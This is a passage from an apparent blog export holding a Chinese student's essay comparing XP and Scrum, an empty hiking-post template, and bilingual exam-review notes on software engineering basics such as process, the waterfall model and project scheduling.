<p>每一个冲刺完成后，都会举行一次冲刺回顾会议，在会议上所有团队成员都要反思这个冲刺。举行冲刺回顾会议是为了进行持续过程改进。会议的时间限制在4小时。</p>
<p>、</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>软件工程概论</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>软件工程之敏捷方法综述:XP与Scrum</title>
    <url>/2020/08/21/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E6%95%8F%E6%8D%B7%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0-XP%E4%B8%8EScrum/</url>
    <content><![CDATA[<p>本文介绍了敏捷方法中的极限编程与Scrum，就二者的相似与区别、各自在实践中的优劣势进行了论述分析。并根据相关资料整理得出其在国内应用的现状，进一步分析其背后的原因，并加以展望未来的发展可能性。</p>
<p>关键词：敏捷开发，极限编程，Scrum，系统开发方法，软件工程</p>
<a id="more"></a>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol>
<li>极限编程与 Scrum方法概述<ol>
<li>什么是极限编程<ol>
<li>极限编程的简述</li>
<li>极限编程的目的</li>
<li>极限编程的12条军规</li>
<li>极限编程的4个价值</li>
</ol>
</li>
<li>什么是Scrum？<ol>
<li>Scrum的简述与流程</li>
<li>Scrum中的三大角色</li>
</ol>
</li>
</ol>
</li>
<li>二者的比较分析<ol>
<li>Xp与scrum的主要异同</li>
<li>二者的区别<ol>
<li>迭代长度的不同</li>
<li>是否允许修改需求</li>
<li>User Story是否严格按照优先级别来实现</li>
<li>是否采用严格的工程方法保证进度或者质量</li>
</ol>
</li>
<li>Xp与 Scrum在生产实践中的优劣</li>
</ol>
</li>
<li>国内应用现状</li>
<li>小结</li>
</ol>
<hr>
<h2 id="一、极限编程与Scrum方法概述"><a href="#一、极限编程与Scrum方法概述" class="headerlink" title="一、极限编程与Scrum方法概述"></a>一、极限编程与Scrum方法概述</h2><h3 id="什么是极限编程（Extreme-Programming，XP）？"><a href="#什么是极限编程（Extreme-Programming，XP）？" class="headerlink" title="什么是极限编程（Extreme Programming，XP）？"></a>什么是极限编程（Extreme Programming，XP）？</h3><h4 id="极限编程的简述"><a href="#极限编程的简述" class="headerlink" title="极限编程的简述"></a>极限编程的简述</h4><p>极限编程是一种软件工程方法学，并且是敏捷软件开发中应用最为广泛和最富有成效的几种方法学之一。相对于传统的软件开发方法学，它更加强调字开发过程中软件需求的不断变化性，认为这种变化是及其正常且不可避免的。正因为如此，极限编程非常注重对于变化的适应，而不是对变化的规避或预测。</p>
<h4 id="极限编程的目的"><a href="#极限编程的目的" class="headerlink" title="极限编程的目的"></a>极限编程的目的</h4><p>极限编程的主要目标在于<strong>降低因需求变更而带来的成本</strong>。</p>
<p>在传统系统开发方法中，系统需求在开始阶段后在之后的开发过程中保持不变的。这意味着项目在进入后期阶段时出现的需求变更将导致开发成本急速增加。</p>
<p>极限编程通过引入基本价值、原则、方法等概念来达到降低变更成本的目的。一个应用了极限编程方法的系统开发项目在应对需求变更时将显得更为灵活。</p>
<h4 id="极限编程的12条军规"><a href="#极限编程的12条军规" class="headerlink" title="极限编程的12条军规"></a>极限编程的12条军规</h4><p>短交付周期    计划游戏    结对编程    可持续的节奏    </p>
<p>代码集体所有    编码规范    简单设计    测试驱动开发    </p>
<p>重构    系统隐喻    持续集成    现场客户</p>
<h4 id="极限编程的4个价值"><a href="#极限编程的4个价值" class="headerlink" title="极限编程的4个价值"></a>极限编程的4个价值</h4><h5 id="沟通"><a href="#沟通" class="headerlink" title="沟通"></a>沟通</h5><p>是在开发小组的成员之间迅速构建与传播制度上的认识的一种方法。极限编程支持设计、抽象、还有用户-程序员间交流的简单化，鼓励经常性的口头交流与回馈。</p>
<h5 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h5><p>鼓励从最简单的解决方式入手，再通过不断重构达到更好的结果。它只关注于对当前的需求来进行设计、编码。为了将来不确定的需求进行设计以及编码意味着在不必要的方面浪费资源。</p>
<p>而且设计与代码上的简化可以提高交流的质量。</p>
<h5 id="反馈"><a href="#反馈" class="headerlink" title="反馈"></a>反馈</h5><p>XP团队重视反馈，反馈越快越好。</p>
<ol>
<li>来自系统的反馈：通过编写单元测试，程序员能够很直观的得到经过修改后系统的状态。</li>
<li>来自客户的反馈：功能性测试是由客户还有测试人员来编写的。他们能由此得知当前系统的状态。</li>
<li>来自小组的反馈：当客户带着新需求来参加项目计划会议时，小组可以直接对于实现新需求所需要的时间进行评估然后反馈给客户。</li>
</ol>
<h5 id="勇气"><a href="#勇气" class="headerlink" title="勇气"></a>勇气</h5><p>勇气是软件开发中的一个重要价值，因为它需要勇气来坦率真诚地面对客户，它需要勇气来识别我们自己，我们的团队和我们的组织的缺点，并努力改善这些缺点。</p>
<h3 id="什么是Scrum？"><a href="#什么是Scrum？" class="headerlink" title="什么是Scrum？"></a>什么是Scrum？</h3><h4 id="Scrum-的简述与流程"><a href="#Scrum-的简述与流程" class="headerlink" title="Scrum 的简述与流程"></a>Scrum 的简述与流程</h4><p>Scrum 是用于开发、交付和持续支持复杂产品的一个框架，是一个增量的、迭代的开发过程。</p>
<p>在这个框架中，整个开发过程由若干个短的迭代周期（Sprint）组成，每个Sprint的建议长度是一至四周。</p>
<p>在Scrum中，使用按照商业价值排序的需求列表（Backlog）来管理产品的需求。Scrum团队总是先开发对客户具有较高价值的需求。</p>
<p>在每一个Sprint计划会议上，将高优先级的需求经过讨论、分析得到相应的任务列表，称它为Sprint backlog。每个成员根据Sprint Backlog再细化成更小的任务。</p>
<p>在一次迭代环节中，需要进行 Daily Scrum Meeting（每日站立会议），每次会议控制在15分钟左右，每个人都必须汇报你昨天完成了什么、承诺你今天要完成什么，以及遇到不能解决的问题。最后要走到黑板前更新自己的 Sprint burn down（Sprint燃尽图）</p>
<p>在每个迭代结束时，Scrum团队将召开  Sprint Retrospective Meeting（回顾会议），总结并讨论改进的地方，放入下一轮Sprint的产品需求中；并递交潜在可交付的产品增量（Increment）</p>
<h4 id="Scrum中的三大角色"><a href="#Scrum中的三大角色" class="headerlink" title="Scrum中的三大角色"></a>Scrum中的三大角色</h4><h5 id="产品负责人（Product-Owner）"><a href="#产品负责人（Product-Owner）" class="headerlink" title="产品负责人（Product Owner）"></a>产品负责人（Product Owner）</h5><p>主要负责确定产品的功能和达到要求的标准，指定软件的发布日期和交付的内容，同时有权力接受或拒绝开发团队的工作成果。</p>
<h5 id="流程管理员（Scrum-Master）"><a href="#流程管理员（Scrum-Master）" class="headerlink" title="流程管理员（Scrum Master）"></a>流程管理员（Scrum Master）</h5><p>主要负责整个Scrum流程在项目中的顺利实施和进行，以及清除挡在客户和开发工作之间的沟通障碍，使得客户可以直接驱动开发。</p>
<h5 id="开发团队（Scrum-Team）"><a href="#开发团队（Scrum-Team）" class="headerlink" title="开发团队（Scrum Team）"></a>开发团队（Scrum Team）</h5><p>主要负责软件产品在Scrum规定流程下进行开发工作，人数控制在5~10人左右，每个成员可能负责不同的技术方面，但要求每成员必须要有很强的自我管理能力，同时具有一定的表达能力；成员可以采用任何工作方式，只要能达到Sprint的目标。</p>
<h2 id="二、二者的比较分析"><a href="#二、二者的比较分析" class="headerlink" title="二、二者的比较分析"></a>二、二者的比较分析</h2><h3 id="XP与Scrum的主要异同"><a href="#XP与Scrum的主要异同" class="headerlink" title="XP与Scrum的主要异同"></a>XP与Scrum的主要异同</h3><h4 id="二者的相同"><a href="#二者的相同" class="headerlink" title="二者的相同"></a>二者的相同</h4><p>同属于敏捷开发，都是为了在不确定或混乱的环境中取得项目的成功。</p>
<p>最终目的相同：都是为了迭代出更好的产品交付给用户。</p>
<h4 id="二者的区别"><a href="#二者的区别" class="headerlink" title="二者的区别"></a>二者的区别</h4><h5 id="迭代长度的不同"><a href="#迭代长度的不同" class="headerlink" title="迭代长度的不同"></a>迭代长度的不同</h5><p>XP的一个Sprint的迭代长度大致为1~2周, 而Scrum的迭代长度一般为 2~ 4周</p>
<h5 id="是否允许修改需求"><a href="#是否允许修改需求" class="headerlink" title="是否允许修改需求"></a>是否允许修改需求</h5><p>XP在一个迭代中，如果一个User Story还没有实现， 则可以考虑用另外的需求将其替换， 替换的原则是需求实现的时间量是相等的。</p>
<p> 而Scrum是不允许这样做的，一旦迭代开工会完毕, 任何需求都不允许添加进来。</p>
<h5 id="User-Story是否严格按照优先级别来实现"><a href="#User-Story是否严格按照优先级别来实现" class="headerlink" title="User Story是否严格按照优先级别来实现"></a>User Story是否严格按照优先级别来实现</h5><p>XP是务必要遵守优先级别的。 但Scrum在这点做得很灵活， 可以不按照优先级别来做。</p>
<h5 id="是否采用严格的工程方法保证进度或者质量"><a href="#是否采用严格的工程方法保证进度或者质量" class="headerlink" title="是否采用严格的工程方法保证进度或者质量"></a>是否采用严格的工程方法保证进度或者质量</h5><p>Scrum没有对软件的整个实施过程定义任何方法。要求开发者自觉保证产品的生产。</p>
<p>但XP对整个流程方法定义非常严格，规定需要采用TDD, 自动测试， 结对编程，简单设计，重构等约束团队的行为。</p>
<h3 id="XP与Scrum在生产实践中的优劣"><a href="#XP与Scrum在生产实践中的优劣" class="headerlink" title="XP与Scrum在生产实践中的优劣"></a>XP与Scrum在生产实践中的优劣</h3><p>Scrum的出现实践比极限开发更早。scrum被定义为一个“框架”，提供了宏观上的概念及方法论——鸡类人员、猪类人员、计划会议、每日站立会议、验收会议和回顾会议等等。但是没有提出对于细节的控制与要求（这在前面的区别也有论述），这导致了Scrum更多的是作为一种实践思想与范本，而不是生产过程中的标准。此外，这也导致了Scrum在实际运用中质量的良莠不齐。</p>
<p>极限开发的出现晚于Scrum ，其中也鲜明地带有或多或少的Scrum烙印。Xp是由“价值观”“原则”和“实践”组成，其中的理念（价值观与）是统筹Xp所有方法的核心。但是在实际的生产实践中，Xp大量的实践约束带来了相当大的成本。无论是人员成本较高的结对编程，还是技术门槛较高的TDD，都给Xp带来了实现的困难。这也导致了在生产实践中，Xp很少会作为一套“完整的流程”，而更多地作为生产中的建议而部分采纳。</p>
<p>当然，实践中更多地是采用两种多种不同的方法之长进行混合开发。</p>
<h2 id="三、国内应用现状"><a href="#三、国内应用现状" class="headerlink" title="三、国内应用现状"></a>三、国内应用现状</h2><p>Scrum作为从国外引进的系统开发的技术。在国内的实践并不顺利。酷壳站长陈皓曾经编译过一篇《为什么Scrum不行？》，其中提到了9个Scrum不行的理由。如下：</p>
<blockquote>
<p><strong>Reason 1:</strong> Scrum的基石是相信人。创造一个安全的环境，这样每个人都能相互学习，相互直言。但是，这是不行的，这世上有很多人并不关心这些，而且政治和竞争到处都是，办公室里无小事，你和别人交心，你相信他们，最终受伤的你自己。你真的以为那里有空间让你可以去犯错，去冒险吗？</p>
<p><strong>Reason 2:</strong> Scrum认为只要给员工足够多的自由员工就能做得最好。这该死的理论是基于什么玩意？不可能，人的天性是懒惰的，他们才不会把事做好的，他们只会做相应报酬的工作量，还可能基本甚至达不到其相应的报酬，大多数人都在混日子。尤其是和经理比起来，谁不想能尽快地成为经理或Team leader啊，因为那样他们就可以即不干活，又挣得多。另外，你给他们自由，你就会发现，他们会只会做他们感兴趣的事，要么聊QQ，要么打游戏，看闲书，反正不干正事。直到你催了，他们才动一动。</p>
<p><strong>Reason 3:</strong> 因为前面的原因，所以，我们仍然要把一个PM放在Scrum团队的上面做管理，这样才会有产出。于是，PM给团队分配任何，管得细枝末节，事无巨细，天天让你做进度汇报，等等。直至把团队拖垮。</p>
<p><strong>Reason 4:</strong>Scrum只不过是一个流程。这世上有太多的流程，尤其是那那些执行CMMI的公司。几乎所有玩CMMI流程的公司，你都能看到的是员工都是那一副副难看的脸。所以，Scrum的流程同样会这样。因为这些都不是开发团队自发出来的，而是上面管你喜欢不喜欢按给你的。Scrum根本不可能增进你的软件质量和技术，只能是优秀的人才才可能！使用Scrum的公司都是些吝啬鬼，他们不愿花大钱招优秀的人，他们妄图使用Scrum这种东西让现有的这些廉价劳动力发挥更大的生产效率，Scrum成了push程序员最有用的工具。</p>
<p><strong>Reason 5:</strong>Scrum delivers ‘business value’。不是这样的，实际上，Scrum不可能。这有很多原因。真正了解业务的那帮人根本不可能加入项目团队，那些人谁TMD愿意和苦逼的技术人员加班啊。 那些人喜欢和我们的用户吃吃喝喝，花天酒地的，根本不会和你们那些奇怪的东西（如：backlog）或是那堆ugly的内向古怪的技术人员打交道，更别说什么技术了。所以，你的团队就像一个客服团队或救火队一样疲于奔命。</p>
<p><strong>Reason 6:</strong> 一个敏捷的团队应该是持续进步的。这就是为什么Scrum总是在问什么干得好，什么需要改进，并定义行动方案。你真的以为员工想进步吗？让他们不得不去想想自己和团队怎么进步，然后他们还不得不去执行行动方案。别天真了，人的天性是不喜欢改变的，人的天性是习惯于一些按部就搬的事，也许那样做令人讨厌，但是人家还是能干点东西出来。如果你逼着人家改变，你就是在压迫人家，人家自然会反抗。</p>
<p><strong>Reason 7:</strong>Product Owner专注于 ‘what’ 和 ‘why’ 的问题，开发团队决定 ‘how’。很不错的分工，于是可以造就一个即高速有重质量的团队。然而，这根本不行。你的Product Owner马上就想要这个功能，他才不管你的软件开发的技术难题，人家只要快，要你meet deadline，要你给我们重要的客户做出承诺。另外，你千万不要以为你们可以轰走这个初级的product owner，因为他的后台是直接汇报到高层管理。你作为一个程序员可能只是其个小部门的一个小喽啰，或者只是外包公司，你觉得可能吗？你觉得建立信任可能吗？</p>
<p><strong>Reason 8:</strong> 软件质量和生产率成正比。也就是说，质量越高，生产率越高。如果质量不高，你开发效率就会低下，但是谁管呢？我们朝九晚五的上班，质量好了也是做8小时，质量差了也是做8小时，无所为嘛。另外，我们的project manager (或者是Scrum master!) 总是会批评我们没有按计划完成。所以，这根本不可能。</p>
<p><strong>Reason 9:</strong> “是的，如果我们只做需要的功能，那么我们就会最低的成本，对吗？”，为什么这世上总是会有这些幼稚的人？这种事怎么可能啊。很多很多的银行或保险公司的项目在你还没有启动项目前就谈好了一个价格（可能还会有回扣），为了打单子，销售什么都干得出来，让你去做项目是因为你是廉价劳动力，而且，他们会不断地加需求，因为软件合同谈好的价格时候，连需求都没有，你去做了才有，还是模糊和不确定或根本就是错的，然后需求是越来越多，越改越多。等你精疲力尽的时候，你才意识到，销售早就把你卖了。</p>
</blockquote>
<p>这九点抨击了<strong>Scrum方法体系中过度的理想化，构建了一个平等、高效、友善的类乌托邦式的开发团队</strong>。而作者指出这一理想环境是很难在现实中遇到的，无论是开发团队成员拒绝不断积极地改进重构；还是项目负责人只是追求开发结果；还是业务人员不愿与团队交流…这些都是在社会语境下会存在的实际问题。</p>
<p>我认为国内对于Scrum方法运用的屡屡碰壁也由此的一部分原因。姑且假设Scrum方法是高效的，但是在我国生产环境及行业背景下却很难将这一高效的特性发挥出来（甚至有可能更加低效）。我国的互联网行业普遍存在高级程序员稀缺、低级程序员泛滥的问题。对于某一出现的问题，可能大部分开发者不适沟通与解决。<strong>Scrum更加适合于一帮资深程序员组成的team，每个人都是牛人，每个人都有激情干活</strong>。在国内大家只是干活拿工资，没什么激情，不适合Scrum。</p>
<p>极限编程在实践落地中的现状与问题已经在前述优劣处提过，在于<strong>过于复杂的实践带来了更高的成本</strong>。结伴开发。每周40工时等一设想几乎不可能在国内互联网公司（尤其是各中小型公司）推广，更多的公司和PM选择借鉴其中的一部分作为项目开发的“建议”。而Xp中的 <strong>价值观 和原则 更是不被互联网公司重视</strong>，可能在互联网及迅速发展的大背景下，更多的公司热衷于能直接带来红利的狼性文化，而不是沟通、简答、反馈和勇气。</p>
<p>尽管如此，我们依旧发现<strong>国内的生产实践中存在不少实践成功的事例</strong>。早在2008年，在 google 的 Agile China 讨论组中出现了一系列的帖子讨论Scrum ，内容涉及对Scrum 的理解、CSM 的接受程度及其在国内的实施效果等方面。从这些讨论的字里行间不难看出，业内人员已对“敏捷”有了更深入的思考，而不再是最初的模仿。发展至今，也许以Xp和Scrum为代表的敏捷开发早已深入人心，但是其<strong>在具体实践中的细节仍然需要国内互联网从业者们根据国情进行不断的取舍、优化与迭代。</strong></p>
<h2 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h2><ol>
<li>极限编程和Scrum作为21世纪兴起的敏捷开发的代表性方法论，各具特性又互相影响。Scrum更多提供了框架供开发团队参考和自我完善。而极限编程作为一整个价值观、原则与实践，为开发的各项环节确定了可供使用的标准。</li>
<li>二者思想相近、内容相异，彼此在兴起与发展过程中互相融合补充。也在十数年的实践中体现了各自的优劣性与适用场景。</li>
<li>目前大多数公司采用以Scrum为框架，Xp中借鉴部分的实践方法进行开发。</li>
<li>国内目前对于二者的应用并不顺利，在引进这两种高效开发方法的同属遇到了很多我国特定的社会与技术问题有待解决。也许未来随着我国互联网产业的进一步成熟，会在此为框架基础上形成一套适合我国国情的中国特色敏捷开发方法体系。</li>
</ol>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
<li>什么是敏捷    <a href="http://www.scrumcn.com/agile/scrum-knowledge-libray/agile101.html" target="_blank" rel="noopener">http://www.scrumcn.com/agile/scrum-knowledge-libray/agile101.html</a></li>
<li>什么是SCRUM    <a href="http://www.scrumcn.com/agile/xp.html" target="_blank" rel="noopener">http://www.scrumcn.com/agile/xp.html</a></li>
<li>什么是极限编程    <a href="http://www.scrumcn.com/agile/scrum-knowledge-library/scrum.html" target="_blank" rel="noopener">http://www.scrumcn.com/agile/scrum-knowledge-library/scrum.html</a></li>
<li>xp和scrum在实战中的应用问题    <a href="https://www.cnblogs.com/cly84920/archive/2012/12/26/4426470.html" target="_blank" rel="noopener">https://www.cnblogs.com/cly84920/archive/2012/12/26/4426470.html</a></li>
<li>敏捷方法之极限编程(XP)和 Scrum区别    <a href="https://www.cnblogs.com/dekevin/p/5613664.html" target="_blank" rel="noopener">https://www.cnblogs.com/dekevin/p/5613664.html</a>)</li>
<li>运用Scrum做项目管理真实案例    <a href="https://blog.csdn.net/lackin/article/details/7265992" target="_blank" rel="noopener">https://blog.csdn.net/lackin/article/details/7265992</a></li>
<li>Scrum 在中国——企业实施情况调查实录   <a href="https://www.infoq.cn/article/scrum_china_2008_investigate" target="_blank" rel="noopener">https://www.infoq.cn/article/scrum_china_2008_investigate</a></li>
<li>凤翼天翔——Scrum 在 Yahoo! 中的成功应用    <a href="https://www.infoq.cn/article/2008/03/Scrum-Adoption-in-Yahoo/" target="_blank" rel="noopener">https://www.infoq.cn/article/2008/03/Scrum-Adoption-in-Yahoo/</a></li>
<li>国人眼中的 Scrum    <a href="https://www.infoq.cn/article/2008/03/Scrum-Perspective-in-China" target="_blank" rel="noopener">https://www.infoq.cn/article/2008/03/Scrum-Perspective-in-China</a></li>
</ol>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>软件工程概论</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>软件工程</tag>
        <tag>敏捷开发</tag>
      </tags>
  </entry>
  <entry>
    <title>山与水-漫步秦岭之雨中紫阁</title>
    <url>/2020/09/22/%E5%B1%B1%E4%B8%8E%E6%B0%B4-%E6%BC%AB%E6%AD%A5%E7%A7%A6%E5%B2%AD%E4%B9%8B%E9%9B%A8%E4%B8%AD%E7%B4%AB%E9%98%81/</url>
    <content><![CDATA[<p>2020年月日</p>
<h1 id="在这里简要概括路线"><a href="#在这里简要概括路线" class="headerlink" title="在这里简要概括路线"></a>在这里简要概括路线</h1><a id="more"></a>
<ul>
<li>山与水    | 游记<ul>
<li>不积硅步 | 徒步系列</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>山与水</category>
        <category>不积硅步</category>
      </categories>
      <tags>
        <tag>游记</tag>
        <tag>漫步秦岭##可选</tag>
      </tags>
  </entry>
  <entry>
    <title>软件工程概论之期末补天笔记</title>
    <url>/2020/08/21/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%AE%BA%E4%B9%8B%E6%9C%9F%E6%9C%AB%E8%A1%A5%E5%A4%A9%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>综述了学校软件工程概论课程的常考知识点(中英对照), 不保证考点完全覆盖.</p>
<p>推荐<a href="https://blog.csdn.net/sandalphon4869/category_9045731.html" target="_blank" rel="noopener">一位学长的博客</a>, 建议搭配打印店往年题食用, 效果奇佳.</p>
<p>西电无纸化之软件工程分群:929629717</p>
<a id="more"></a>
<h2 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h2><h3 id="定义-软件"><a href="#定义-软件" class="headerlink" title="定义: 软件"></a>定义: <strong>软件</strong></h3><p><em>必考</em></p>
<p>软件是文档、指令、数据结构的集合</p>
<ul>
<li><strong>Documents</strong> that describe the operation and use of the programs.<br>文档描述了程序的操作(operation)和使用(use)。</li>
<li><strong>Instructions</strong> (computer programs) that when executed provide desired function and performance;<br>指令在执行时提供了所需的功能(function)和性能(performance)。</li>
<li><strong>Data</strong> <strong>structures</strong> that enable the programs to adequately manipulate information;<br>数据结构使程序能够充分地操作信息(information)。</li>
</ul>
<h3 id="软件的3个特性"><a href="#软件的3个特性" class="headerlink" title="软件的3个特性"></a><strong>软件的3个特性</strong></h3><p><em>理解</em></p>
<ol>
<li>Software is developed or engineered, it is not manufactured in the classical sense.<br>软件是开发或工程的，而不是传统意义上的制造.</li>
<li>Software doesn’t “wear out”, but it does deteriorate.<br>软件不会“磨损”，但会恶化。</li>
<li>Most software is custom-built, rather than being assembled from existing component.<br>大多数软件都是定制的，而不是由现有组件组装而成.</li>
</ol>
<h3 id="定义-软件工程"><a href="#定义-软件工程" class="headerlink" title="定义: 软件工程 "></a>定义: <strong>软件工程 </strong></h3><p><em>必考</em></p>
<p>The application of a <strong>systematic</strong> , <strong>disciplined</strong>, <strong>measure-able</strong> approach to the <strong>development</strong>, <strong>operation</strong>, and <strong>maintenance</strong> of software. That is, the application of engineering to software.</p>
<p>软件工程是将系统的(systematic)、规范的(disciplined)、可度量的(measurable)方法应用于软件的开发(development)、运行(operation)和维护(maintenance)的过程，即将工程化应用于软件中。</p>
<h3 id="软件涉及到的人员"><a href="#软件涉及到的人员" class="headerlink" title="软件涉及到的人员"></a>软件涉及到的人员</h3><ul>
<li>consumer   需求提出者</li>
<li>developer   开发人员</li>
<li>user   软件的实际使用者</li>
</ul>
<h3 id="质量指标"><a href="#质量指标" class="headerlink" title="质量指标"></a>质量指标</h3><p> <em>理解</em></p>
<ol>
<li><p>The Quality of the Product,  <strong>McCall</strong></p>
<p>度量<strong>软件质量</strong>的指标模型</p>
</li>
<li><p>The Quality of the Process,  <strong>CMM</strong> (Capability Maturity Mode)</p>
<p>度量<strong>过程质量</strong>的指标模型</p>
</li>
<li><p>The Quality in the Context of the Business Environment, <strong>ROI</strong></p>
<p>度量<strong>商业价值</strong>的指标模型</p>
</li>
</ol>
<h2 id="第二章-过程"><a href="#第二章-过程" class="headerlink" title="第二章 过程"></a>第二章 过程</h2><h3 id="定义-过程-process"><a href="#定义-过程-process" class="headerlink" title="定义: 过程 process"></a>定义: <strong>过程 process</strong></h3><p><em>必考</em></p>
<p>process：</p>
<ul>
<li>A series of <strong>ordered steps</strong> involving <u><strong>activities</strong>, <strong>constraints</strong>, and <strong>resources</strong></u> that <strong><u>produce an intended output</u></strong> of some kind.</li>
<li>一系列涉及活动、约束和资源的步骤，这些步骤会产生某种预期的输出。</li>
</ul>
<h3 id="Characteristics-of-process"><a href="#Characteristics-of-process" class="headerlink" title="Characteristics of process"></a>Characteristics of process</h3><p><em>了解</em></p>
<ol>
<li>过程描述了所有主要的过程活动。<pre><code>   The process describes all the major  process activities.
</code></pre></li>
<li>这个过程使用资源，但受到一系列限制，并生产中间产品和最终产品。<pre><code>   The process uses the resources, subject to a set of constraints, and produces intermediate and final products.
</code></pre></li>
<li>过程可能由以某种方式链接的子过程组成。<pre><code>     The process may be composed of sub-processes that that linked in some way。
</code></pre></li>
<li>每个过程活动都有进入和退出标准，因此我们知道活动开始和结束的时间。<pre><code>   Each process activity has entry and exit criteria, so that we know when the activity begins and ends .
</code></pre></li>
<li>活动按顺序组织，因此一个活动相对于另一个活动的执行时间很清楚。<pre><code>     The activities are organized in a sequence, so that it is clear when one activity is performed relative to the other activity .
</code></pre></li>
<li>每个过程都有一组指导原则来解释每个活动的目标。<pre><code>     Every process has a set of guiding principles that explain the goals of each activity。
</code></pre></li>
<li>约束或控制可以应用于活动、资源或产品<pre><code>   Constraints  or controls may apply to an activity, resource, or product。
</code></pre></li>
</ol>
<h3 id="定义-生命周期-Life-cycle"><a href="#定义-生命周期-Life-cycle" class="headerlink" title="定义: 生命周期 Life cycle"></a>定义: <strong>生命周期 Life cycle</strong></h3><p><em>必考</em></p>
<ul>
<li>当过程涉及到建设某些产品，我们有时把过程称为生命周期。</li>
<li>when the process involves the building of some product, we sometimes refer to the process as a life cycle.</li>
<li>The life cycle of a software product include <strong>conception</strong>(概念化)，<strong>implementation</strong>(实现)，<strong>delivery</strong>(交付)，<strong>use</strong>, <strong>maintenance</strong>.(维护)</li>
</ul>
<h3 id="定义-模型"><a href="#定义-模型" class="headerlink" title="定义: 模型"></a>定义: 模型</h3><p>  <em>了解</em></p>
<ul>
<li>一个过程可以用多种方法来描述，使用文字、图片或组合</li>
</ul>
<p>A process can be described in a variety of ways, using text, pictures or a combination.</p>
<h4 id="瀑布模型"><a href="#瀑布模型" class="headerlink" title="瀑布模型"></a><strong>瀑布模型</strong></h4><p><em>必考(步骤与优缺点)</em></p>
<h4 id="Step-8"><a href="#Step-8" class="headerlink" title="Step (8)"></a>Step (8)</h4><ol>
<li>Requirements Analysis 需求分析</li>
<li>System Design 系统设计</li>
<li>Program Design 程序设计</li>
<li>Coding 编程</li>
<li>Unit &amp; Integration Test 单元&amp;集成测试</li>
<li>System Test 系统测试</li>
<li>Acceptance Test 验收测试</li>
<li>Operation &amp; Maintenance 使用与维护</li>
</ol>
<p>特点</p>
<ol>
<li><p>One of the first process development models </p>
<p>是第一个被提出的开发模型之一</p>
</li>
<li><p>Works for well understood problems with minimal or no changes in the requirements</p>
<p>仅需极少的需求或没有任何变化即可解决众所周知的问题</p>
</li>
<li><p>It presents a very high-level view of the development process开发过程的顶层理解</p>
</li>
<li><p>and sequence of process activities 过程活动的顺序</p>
</li>
<li><p>Each major phase is marked by milestones and deliverables  每个主要阶段都具有里程碑和可交付成果</p>
</li>
</ol>
<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
<li><p>The waterfall model can be very useful in <u>helping developers lay out what they need to do</u>.</p>
<p>在帮助开发人员规划他们需要做的事情时非常有用</p>
</li>
<li><p>Its simplicity makes it <u>easy to explain to customers</u> who are not familiar with software development.</p>
<p>它的简单性使得向不熟悉软件开发的客户解释它很容易</p>
</li>
<li><p>It <u>makes explicit which intermediate products are necessary</u> in order to begin the next stage of development.</p>
<p>它明确了哪些中间产品是必要的，以便开始下一阶段的开发。</p>
</li>
<li><p>Many other,more complex models are really just embellishments of waterfall,incorporating feedback loops and extra activities. </p>
<p>许多其他更复杂的模型实际上只是瀑布的点缀</p>
</li>
</ul>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li><p>Provides no guidance how to handle changes to products and activities during development (<u>assumes requirements can be frozen</u>)</p>
<p>没有提供有关如何在开发过程中处理产品和活动更改的指导（假设要求可以冻结）</p>
</li>
<li><p>Views software development as manufacturing process rather than as creative process</p>
<p>将软件开发视为制造过程而非创意过程</p>
</li>
<li><p>There is <u>no iterative activities</u> that lead to creating a final Product</p>
<p>没有迭代活动可以创建最终产品</p>
</li>
<li><p>Long wait before a final product</p>
<p>长时间等待最终产品</p>
</li>
</ul>
<h2 id="第三章-项目管理"><a href="#第三章-项目管理" class="headerlink" title="第三章 项目管理"></a>第三章 项目管理</h2><h3 id="定义-进度-Schedule"><a href="#定义-进度-Schedule" class="headerlink" title="定义: 进度 Schedule"></a>定义: 进度 Schedule</h3><ul>
<li>A project schedule describes the software development cycle for a particular project by enumerating the phases or stages of the project and breaking each into discrete tasks or activities to be done.</li>
<li>项目进度通过列举项目的时期或阶段，并将每个阶段分解为待完成的离散任务或活动来描述特定项目的软件开发周期。</li>
<li>The schedule is a <strong>timeline</strong> that shows when activities will begin and end,and when the related development products while be ready.</li>
<li>进度是显示活动开始和结束的时间线，以及相关开发产品准备就绪的时间线</li>
</ul>
<h3 id="定义-活动"><a href="#定义-活动" class="headerlink" title="定义: 活动"></a>定义: <strong>活动</strong></h3><ul>
<li>An activity is a <u>part of the project that takes place over a period of time</u>.</li>
<li>活动是在一段时间内发生的项目的一部分</li>
</ul>
<h3 id="定义-里程碑-Milestone"><a href="#定义-里程碑-Milestone" class="headerlink" title="定义: 里程碑 Milestone"></a>定义: <strong>里程碑</strong> Milestone</h3><ul>
<li>A milestone is <strong><u>the completion of an activity</u></strong>，<strong><u>a particular point in time</u></strong>.</li>
<li>里程碑是一个活动的完成，一个特定的时间点。</li>
</ul>
<h3 id="WBS"><a href="#WBS" class="headerlink" title="WBS"></a>WBS</h3><ul>
<li>工作分解结构(WBS)将项目描述为一组离散的工作片段。</li>
<li>work breakdown structure depicts the project as a set of discrete pieces of work.<ul>
<li>Precursor is an event or set of events that must occur before the activity can begin.<br>前驱是在活动开始之前必须发生的一个或一组事件。</li>
<li>Due date is the date by which the activity must be completed,frequently determined by contractual deadlines.<br>截止时间是活动必须完成的日期，通常由合同期限决定。</li>
<li>Duration is length of time needed to complete an activity。<br>工期是完成一项活动所需的时间长度。</li>
<li>Endpoint is usually a milestone or deliverable<br>终点是里程碑或可交付件。</li>
